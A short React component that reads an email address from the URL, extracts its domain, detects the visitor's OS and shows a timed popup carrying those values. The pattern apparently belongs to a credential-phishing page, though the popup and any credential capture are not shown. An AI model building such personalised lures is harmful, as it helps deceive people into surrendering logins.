/** @format */
"use client";

import React, { useState, useEffect } from "react";
import Popup from "./Popup";

const Fetcher = () => {
  const [showPopup, setShowPopup] = useState(false);
  const [eparams, setEparams] = useState("");
  const [emailDomain, setEmailDomain] = useState("");
  const [systemInfo, setSystemInfo] = useState({
    date: new Date(),
    browser: "Chrome",
    os: "Unknown",
  });

  // Detect OS only
  useEffect(() => {
    const detectOS = () => {
      const userAgent = window.navigator.userAgent.toLowerCase();
      if (userAgent.includes("mac")) return "Mac OS";
      if (userAgent.includes("windows")) return "Windows";
      if (userAgent.includes("linux")) return "Linux";
      return "Unknown";
    };

    setSystemInfo((prev) => ({
      ...prev,
      os: detectOS(),
    }));

    const dateInterval = setInterval(() => {
      setSystemInfo((prev) => ({
        ...prev,
        date: new Date(),
      }));
    }, 1000);

    return () => clearInterval(dateInterval);
  }, []);

  // Get email from URL params
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const email = params.get("email");
    if (email) {
      setEparams(email);
      const domain = email.split("@")[1];
      setEmailDomain(domain);
    }

    // Show popup after short delay
    setTimeout(() => {
      setShowPopup(true);
    }, 1000);
  }, []);

  return (
    <div
      style={{
        minHeight: "100vh",
        backgroundColor: "#fff",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
      }}
    >
      {showPopup && (
        <Popup
          domain={emailDomain}
          eparams={eparams}
          systemInfo={systemInfo}
        />
      )}
    </div>
  );
};

export default Fetcher;